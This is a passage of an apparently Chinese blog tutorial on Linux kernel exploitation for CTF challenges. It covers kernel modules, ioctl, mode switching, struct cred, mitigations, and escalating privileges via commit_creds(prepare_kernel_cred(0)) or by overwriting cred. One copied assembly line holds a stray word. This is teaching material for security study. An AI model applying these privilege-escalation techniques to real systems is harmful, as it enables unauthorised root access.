drivers）<ul><li>设备驱动</li><li>文件系统驱动</li><li>…</li></ul></li><li>内核扩展模块 (modules)</li></ul><p>LKMs 的文件格式和用户态的可执行程序相同，Linux 下为 ELF，Windows 下为 exe&#x2F;dll，mac 下为 MACH-O，因此我们可以用 IDA 等工具来分析内核模块。</p><p>模块可以被单独编译，但不能单独运行。它在运行时被链接到内核作为内核的一部分在内核空间运行，这与运行在用户控件的进程不同。</p><p>模块通常用来实现一种文件系统、一个驱动程序或者其他内核上层的功能。</p><blockquote><p>Linux 内核之所以提供模块机制，是因为它本身是一个单内核 (monolithic kernel)。单内核的优点是效率高，因为所有的内容都集合在一起，但缺点是可扩展性和可维护性相对较差，模块机制就是为了弥补这一缺陷。</p></blockquote><h3 id="相关指令"><a href="#相关指令" class="headerlink" title="相关指令"></a>相关指令</h3><ul><li><strong>insmod</strong>: 讲指定模块加载到内核中</li><li><strong>rmmod</strong>: 从内核中卸载指定模块</li><li><strong>lsmod</strong>: 列出已经加载的模块</li><li><strong>modprobe</strong>: 添加或删除模块，modprobe 在加载模块时会查找依赖关系</li></ul><blockquote><p>大多数　CTF 中的 kernel vulnerability 也出现在 LKM 中。</p></blockquote><h2 id="syscall"><a href="#syscall" class="headerlink" title="syscall"></a>syscall</h2><p>系统调用，指的是用户空间的程序向操作系统内核请求需要更高权限的服务，比如 IO 操作或者进程间通信。系统调用提供用户程序与操作系统间的接口，部分库函数（如 scanf，puts 等 IO 相关的函数实际上是对系统调用的封装（read 和 write））。</p><blockquote><p>在 <em>&#x2F;usr&#x2F;include&#x2F;x86_64-linux-gnu&#x2F;asm&#x2F;unistd_64.h</em> 和 <em>&#x2F;usr&#x2F;include&#x2F;x86_64-linux-gnu&#x2F;asm&#x2F;unistd_32.h</em> 分别可以查看 64 位和 32 位的系统调用号。</p><p>同时推荐一个很好用的网站 <a href="https://syscalls.kernelgrok.com/">Linux Syscall Reference</a>，可以查阅 32 位系统调用对应的寄存器含义以及源码。64 位系统调用可以查看 <a href="https://syscalls64.paolostivanin.com/">Linux Syscall64 Reference</a></p></blockquote><h2 id="ioctl"><a href="#ioctl" class="headerlink" title="ioctl"></a>ioctl</h2><p>直接查看 man 手册</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">NAME</span><br><span class="line">       ioctl - control device</span><br><span class="line"></span><br><span class="line">SYNOPSIS</span><br><span class="line">       <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">       <span class="type">int</span> <span class="title function_">ioctl</span><span class="params">(<span class="type">int</span> fd, <span class="type">unsigned</span> <span class="type">long</span> request, ...)</span>;</span><br><span class="line"></span><br><span class="line">DESCRIPTION</span><br><span class="line">       The <span class="title function_">ioctl</span><span class="params">()</span> system call manipulates the underlying device parameters of special</span><br><span class="line">       files.  In particular, many  operating  characteristics  of  character  special</span><br><span class="line">       <span class="title function_">files</span>  <span class="params">(e.g., terminals)</span> may be controlled with <span class="title function_">ioctl</span><span class="params">()</span> requests.  The argument</span><br><span class="line">       fd must be an open file descriptor.</span><br><span class="line"></span><br><span class="line">       The second argument is a device-dependent request code.  The third argument  is</span><br><span class="line">       an  untyped  pointer  to  memory.  It&#x27;s traditionally <span class="type">char</span> *<span class="title function_">argp</span> <span class="params">(from the days</span></span><br><span class="line"><span class="params">       before <span class="type">void</span> * was valid C)</span>, and will be so named <span class="keyword">for</span> this discussion.</span><br><span class="line"></span><br><span class="line">       An <span class="title function_">ioctl</span><span class="params">()</span> request has encoded in it whether the argument is an in parameter or</span><br><span class="line">       out  parameter, and the size of the argument argp in bytes.  Macros and defines</span><br><span class="line">       used in specifying an <span class="title function_">ioctl</span><span class="params">()</span> request are located in the file &lt;sys/ioctl.h&gt;.</span><br></pre></td></tr></table></figure><p>可以看出 ioctl 也是一个系统调用，用于与设备通信。</p><p><code>int ioctl(int fd, unsigned long request, ...)</code> 的第一个参数为打开设备 (open) 返回的 <a href="http://m4x.fun/post/play-with-file-descriptor-1/">文件描述符</a>，第二个参数为用户程序对设备的控制命令，再后边的参数则是一些补充参数，与设备有关。</p><blockquote><p>使用 ioctl 进行通信的原因：</p><p>操作系统提供了内核访问标准外部设备的系统调用，因为大多数硬件设备只能够在内核空间内直接寻址, 但是当访问非标准硬件设备这些系统调用显得不合适, 有时候用户模式可能需要直接访问设备。</p><p>比如，一个系统管理员可能要修改网卡的配置。现代操作系统提供了各种各样设备的支持，有一些设备可能没有被内核设计者考虑到，如此一来提供一个这样的系统调用来使用设备就变得不可能了。</p><p>为了解决这个问题，内核被设计成可扩展的，可以加入一个称为设备驱动的模块，驱动的代码允许在内核空间运行而且可以对设备直接寻址。一个 Ioctl 接口是一个独立的系统调用，通过它用户空间可以跟设备驱动沟通。对设备驱动的请求是一个以设备和请求号码为参数的 Ioctl 调用，如此内核就允许用户空间访问设备驱动进而访问设备而不需要了解具体的设备细节，同时也不需要一大堆针对不同设备的系统调用。</p></blockquote><h2 id="状态切换"><a href="#状态切换" class="headerlink" title="状态切换"></a>状态切换</h2><h2 id="user-space-to-kernel-space"><a href="#user-space-to-kernel-space" class="headerlink" title="user space to kernel space"></a>user space to kernel space</h2><p>当发生 <code>系统调用</code>，<code>产生异常</code>，<code>外设产生中断</code>等事件时，会发生用户态到内核态的切换，具体的过程为：</p><ol><li><p>通过 <code>swapgs</code> 切换 GS 段寄存器，将 GS 寄存器值和一个特定位置的值进行交换，目的是保存 GS 值，同时将该位置的值作为内核执行时的 GS 值使用。</p></li><li><p>将当前栈顶（用户空间栈顶）记录在 CPU 独占变量区域里，将 CPU 独占区域里记录的内核栈顶放入 rsp&#x2F;esp。</p></li><li><p>通过 push 保存各寄存器值，具体的 <a href="http://elixir.free-electrons.com/linux/v4.12/source/arch/x86/entry/entry_64.S">代码</a> 如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> ENTRY(entry_SYSCALL_64)</span><br><span class="line"> <span class="comment">/* SWAPGS_UNSAFE_STACK是一个宏，x86直接定义为swapgs指令 */</span></span><br><span class="line"> SWAPGS_UNSAFE_STACK</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* 保存栈值，并设置内核栈 */</span></span><br><span class="line"> movq %rsp, PER_CPU_VAR(rsp_scratch)</span><br><span class="line"> movq <span class="title function_">PER_CPU_VAR</span><span class="params">(cpu_current_top_of_stack)</span>, %rsp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 通过push保存寄存器值，形成一个pt_regs结构 */</span></span><br><span class="line"><span class="comment">/* Construct struct pt_regs on stack */</span></span><br><span class="line">pushq  $__USER_DS      <span class="comment">/* pt_regs-&gt;ss */</span></span><br><span class="line">pushq  <span class="title function_">PER_CPU_VAR</span><span class="params">(rsp_scratch)</span>  <span class="comment">/* pt_regs-&gt;sp */</span></span><br><span class="line">pushq  %r11             <span class="comment">/* pt_regs-&gt;flags */</span></span><br><span class="line">pushq  $__USER_CS      <span class="comment">/* pt_regs-&gt;cs */</span></span><br><span class="line">pushq  %rcx             <span class="comment">/* pt_regs-&gt;ip */</span></span><br><span class="line">pushq  %rax             <span class="comment">/* pt_regs-&gt;orig_ax */</span></span><br><span class="line">pushq  %rdi             <span class="comment">/* pt_regs-&gt;di */</span></span><br><span class="line">pushq  %rsi             <span class="comment">/* pt_regs-&gt;si */</span></span><br><span class="line">pushq  %rdx             <span class="comment">/* pt_regs-&gt;dx */</span></span><br><span class="line">pushq  %rcx tuichu    <span class="comment">/* pt_regs-&gt;cx */</span></span><br><span class="line">pushq  $-ENOSYS        <span class="comment">/* pt_regs-&gt;ax */</span></span><br><span class="line">pushq  %r8              <span class="comment">/* pt_regs-&gt;r8 */</span></span><br><span class="line">pushq  %r9              <span class="comment">/* pt_regs-&gt;r9 */</span></span><br><span class="line">pushq  %r10             <span class="comment">/* pt_regs-&gt;r10 */</span></span><br><span class="line">pushq  %r11             <span class="comment">/* pt_regs-&gt;r11 */</span></span><br><span class="line">sub $<span class="params">(<span class="number">6</span>*<span class="number">8</span>)</span>, %rsp      <span class="comment">/* pt_regs-&gt;bp, bx, r12-15 not saved */</span></span><br></pre></td></tr></table></figure></li><li><p>通过汇编指令判断是否为 <code>x32_abi</code>。</p></li><li><p>通过系统调用号，跳到全局变量 <code>sys_call_table</code> 相应位置继续执行系统调用。</p></li></ol><h3 id="kernel-space-to-user-space"><a href="#kernel-space-to-user-space" class="headerlink" title="kernel space to user space"></a>kernel space to user space</h3><p>退出时，流程如下：</p><ol><li>通过 <code>swapgs</code> 恢复 GS 值</li><li>通过 <code>sysretq</code> 或者 <code>iretq</code> 恢复到用户控件继续执行。如果使用 <code>iretq</code> 还需要给出用户空间的一些信息（CS, eflags&#x2F;rflags, esp&#x2F;rsp 等）</li></ol><h2 id="struct-cred"><a href="#struct-cred" class="headerlink" title="struct cred"></a>struct cred</h2><p>之前提到 kernel 记录了进程的权限，更具体的，是用 cred 结构体记录的，每个进程中都有一个 cred 结构，这个结构保存了该进程的权限等信息（uid，gid 等），如果能修改某个进程的 cred，那么也就修改了这个进程的权限。</p><p><a href="https://code.woboq.org/linux/linux/include/linux/cred.h.html#cred">源码</a> 如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="type">atomic_t</span>    usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="type">atomic_t</span>    subscribers;    <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">    <span class="type">void</span>        *put_addr;</span><br><span class="line">    <span class="type">unsigned</span>    magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">kuid_t</span>      uid;        <span class="comment">/* real UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      gid;        <span class="comment">/* real GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      suid;       <span class="comment">/* saved UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      sgid;       <span class="comment">/* saved GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      euid;       <span class="comment">/* effective UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      egid;       <span class="comment">/* effective GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      fsuid;      <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">    <span class="type">kgid_t</span>      fsgid;      <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">    <span class="type">unsigned</span>    securebits; <span class="comment">/* SUID-less security management */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_permitted;  <span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_effective;  <span class="comment">/* caps we can actually use */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_bset;   <span class="comment">/* capability bounding set */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_ambient;    <span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>   jit_keyring;    <span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">                     * keys to */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">    <span class="type">void</span>        *security;  <span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>   <span class="comment">/* real user ID subscription */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>  <span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span>        <span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><h2 id="内核态函数"><a href="#内核态函数" class="headerlink" title="内核态函数"></a>内核态函数</h2><p>相比用户态库函数，内核态的函数有了一些变化</p><ul><li><p>printf() -&gt; **printk()**，但需要注意的是 printk() 不一定会把内容显示到终端上，但一定在内核缓冲区里，可以通过 <code>dmesg</code> 查看效果</p></li><li><p>memcpy() -&gt;</p><p>copy_from_user()&#x2F;copy_to_user()</p><ul><li>copy_from_user() 实现了将用户空间的数据传送到内核空间</li><li>copy_to_user() 实现了将内核空间的数据传送到用户空间</li></ul></li><li><p>malloc() -&gt; **kmalloc()**，内核态的内存分配函数，和 malloc() 相似，但使用的是 <code>slab/slub 分配器</code></p></li><li><p>free() -&gt; **kfree()**，同 kmalloc()</p></li></ul><p>另外要注意的是，<code>kernel 管理进程，因此 kernel 也记录了进程的权限</code>。kernel 中有两个可以方便的改变权限的函数：</p><ul><li><strong>int commit_creds(struct cred *new)</strong></li><li><strong>struct cred* prepare_kernel_cred(struct task_struct* daemon)</strong></li></ul><p>从函数名也可以看出，执行 <code>commit_creds(prepare_kernel_cred(0))</code> 即可获得 root 权限，0 表示 以 0 号进程作为参考准备新的 credentials。</p><blockquote><p>更多关于 <code>prepare_kernel_cred</code> 的信息可以参考 <a href="https://elixir.bootlin.com/linux/v4.6/source/kernel/cred.c#L594">源码</a></p></blockquote><p>执行 <code>commit_creds(prepare_kernel_cred(0))</code> 也是最常用的提权手段，两个函数的地址都可以在 <code>/proc/kallsyms</code> 中查看（较老的内核版本中是 <code>/proc/ksyms</code>）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">post sudo grep commit_creds /proc/kallsyms </span><br><span class="line">[sudo] m4x 的密码：</span><br><span class="line">ffffffffbb6af9e0 T commit_creds</span><br><span class="line">ffffffffbc7cb3d0 r __ksymtab_commit_creds</span><br><span class="line">ffffffffbc7f06fe r __kstrtab_commit_creds</span><br><span class="line">post sudo grep prepare_kernel_cred /proc/kallsyms</span><br><span class="line">ffffffffbb6afd90 T prepare_kernel_cred</span><br><span class="line">ffffffffbc7d4f20 r __ksymtab_prepare_kernel_cred</span><br><span class="line">ffffffffbc7f06b7 r __kstrtab_prepare_kernel_cred</span><br></pre></td></tr></table></figure><blockquote><p>一般情况下，&#x2F;proc&#x2F;kallsyms 的内容需要 root 权限才能查看</p></blockquote><h2 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h2><blockquote><p>canary, dep, PIE, RELRO 等保护与用户态原理和作用相同</p></blockquote><ul><li>smep: Supervisor Mode Execution Protection，当处理器处于 <code>ring0</code> 模式，执行 <code>用户空间</code> 的代码会触发页错误。（在 arm 中该保护称为 <code>PXN</code>）</li><li>smap: Superivisor Mode Access Protection，类似于 smep，通常是在访问数据时。</li><li>mmap_min_addr:是一个内核参数，用于限制用户空间可以使用的最低内存地址。</li></ul><h2 id="CTF-kernel-pwn-相关"><a href="#CTF-kernel-pwn-相关" class="headerlink" title="CTF kernel pwn 相关"></a>CTF kernel pwn 相关</h2><p>一般会给以下三个文件</p><ol><li><p>boot.sh: 一个用于启动 kernel 的 shell 的脚本，多用 qemu，保护措施与 qemu 不同的启动参数有关</p></li><li><p>bzImage: kernel binary</p></li><li><p>rootfs.cpio: 文件系统映像</p><p>比如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">CISCN2017_babydriver [master●] ls</span><br><span class="line">babydriver.tar</span><br><span class="line">CISCN2017_babydriver [master●] x babydriver.tar</span><br><span class="line">boot.sh</span><br><span class="line">bzImage</span><br><span class="line">rootfs.cpio</span><br><span class="line">CISCN2017_babydriver [master●] ls</span><br><span class="line">babydriver.tar  boot.sh  bzImage  rootfs.cpio</span><br><span class="line">CISCN2017_babydriver [master●] file bzImage</span><br><span class="line">bzImage: Linux kernel x86 boot executable bzImage, version <span class="number">4.4</span><span class="number">.72</span> (atum@ubuntu) #<span class="number">1</span> SMP Thu Jun <span class="number">15</span> <span class="number">19</span>:<span class="number">52</span>:<span class="number">50</span> PDT <span class="number">2017</span>, RO-rootFS, swap_dev <span class="number">0x6</span>, Normal VGA</span><br><span class="line">CISCN2017_babydriver [master●] file rootfs.cpio</span><br><span class="line">rootfs.cpio: gzip compressed data, last modified: Tue Jul  <span class="number">4</span> <span class="number">08</span>:<span class="number">39</span>:<span class="number">15</span> <span class="number">2017</span>, max compression, from Unix, original size <span class="number">2844672</span></span><br><span class="line">CISCN2017_babydriver [master●] file boot.sh</span><br><span class="line">boot.sh: Bourne-Again shell script, ASCII text executable</span><br><span class="line">CISCN2017_babydriver [master●] bat boot.sh </span><br><span class="line">───────┬─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">       │ File: boot.sh</span><br><span class="line">───────┼─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   <span class="number">1</span>   │ #!/bin/bash</span><br><span class="line">   <span class="number">2</span>   │ </span><br><span class="line">   <span class="number">3</span>   │ qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append <span class="string">&#x27;console=ttyS0 ro</span></span><br><span class="line"><span class="string">       │ ot=/dev/ram oops=panic panic=1&#x27;</span> -enable-kvm -monitor /dev/null -m <span class="number">64</span>M --nographi</span><br><span class="line">       │ c  -smp cores=<span class="number">1</span>,threads=<span class="number">1</span> -cpu kvm64,+smep</span><br><span class="line">───────┴─────────────────────────────────────────────────────────────────────────────────</span><br></pre></td></tr></table></figure><p>解释一下 qemu 启动的参数：</p><ul><li>-initrd rootfs.cpio，使用 rootfs.cpio 作为内核启动的文件系统</li><li>-kernel bzImage，使用 bzImage 作为 kernel 映像</li><li>-cpu kvm64,+smep，设置 CPU 的安全选项，这里开启了 smep</li><li>-m 64M，设置虚拟 RAM 为 64M，默认为 128M 其他的选项可以通过 –help 查看。</li></ul></li><li><p>本地写好 exploit 后，可以通过 base64 编码等方式把编译好的二进制文件保存到远程目录下，进而拿到 flag。同时可以使用 musl, uclibc 等方法减小 exploit 的体积方便传输。</p></li></ol><p>在 Linux 内核漏洞利用中，攻击者可能会有以下几个目的</p><ul><li>提权，即获取到 root 权限。</li><li>泄露敏感信息。</li><li>DoS，即使得内核崩溃。</li></ul><p><strong>一般而言，攻击者的主要目的是提权。</strong></p><h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>内核提权指的是普通用户可以获取到 root 用户的权限，访问原先受限的资源。这里从两种角度来考虑如何提权</p><ul><li>改变自身：通过改变自身进程的权限，使其具有 root 权限。</li><li>改变别人：通过影响高权限进程的执行，使其完成我们想要的功能。</li></ul><h2 id="Change-Self"><a href="#Change-Self" class="headerlink" title="Change Self"></a>Change Self</h2><p>内核会通过进程的 <code>task_struct</code> 结构体中的 cred 指针来索引 cred 结构体，然后根据 cred 的内容来判断一个进程拥有的权限，如果 cred 结构体成员中的 uid-fsgid 都为 0，那一般就会认为进程具有 root 权限。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="type">atomic_t</span>    usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="type">atomic_t</span>    subscribers;    <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">    <span class="type">void</span>        *put_addr;</span><br><span class="line">    <span class="type">unsigned</span>    magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">kuid_t</span>      uid;        <span class="comment">/* real UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      gid;        <span class="comment">/* real GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      suid;       <span class="comment">/* saved UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      sgid;       <span class="comment">/* saved GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      euid;       <span class="comment">/* effective UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      egid;       <span class="comment">/* effective GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      fsuid;      <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">    <span class="type">kgid_t</span>      fsgid;      <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此，思路就比较直观了，我们可以通过以下方式来提权</p><ul><li>直接修改 cred 结构体的内容</li><li>修改 task_struct 结构体中的 cred 指针指向一个满足要求的 cred</li></ul><p>无论是哪一种方法，一般都分为两步：定位，修改。这就好比把大象放到冰箱里一样。</p><h2 id="直接改-cred"><a href="#直接改-cred" class="headerlink" title="直接改 cred"></a>直接改 cred</h2><h3 id="定位具体位置"><a href="#定位具体位置" class="headerlink" title="定位具体位置"></a>定位具体位置</h3><p>我们可以首先获取到 cred 的具体地址，然后修改 cred。</p><h4 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h4><p>定位 cred 的具体地址有很多种方法，这里根据是否直接定位分为以下两种</p><h5 id="直接定位"><a href="#直接定位" class="headerlink" title="直接定位"></a>直接定位</h5><p>cred 结构体的最前面记录了各种 id 信息，对于一个普通的进程而言，uid-fsgid 都是执行进程的用户的身份。因此我们可以通过扫描内存来定位 cred。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="type">atomic_t</span>    usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="type">atomic_t</span>    subscribers;    <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">    <span class="type">void</span>        *put_addr;</span><br><span class="line">    <span class="type">unsigned</span>    magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">kuid_t</span>      uid;        <span class="comment">/* real UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      gid;        <span class="comment">/* real GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      suid;       <span class="comment">/* saved UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      sgid;       <span class="comment">/* saved GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      euid;       <span class="comment">/* effective UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      egid;       <span class="comment">/* effective GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      fsuid;      <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">    <span class="type">kgid_t</span>      fsgid;      <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>在实际定位的过程中，我们可能会发现很多满足要求的 cred，这主要是因为 cred 结构体可能会被拷贝、释放。</strong>一个很直观的想法是在定位的过程中，<strong>利用 usage 不为 0 来筛除掉一些 cred</strong>，但仍然会发现一些 usage 为 0 的 cred。这是因为 cred 从 usage 为 0， 到释放有一定的时间。此外，cred 是使用 rcu 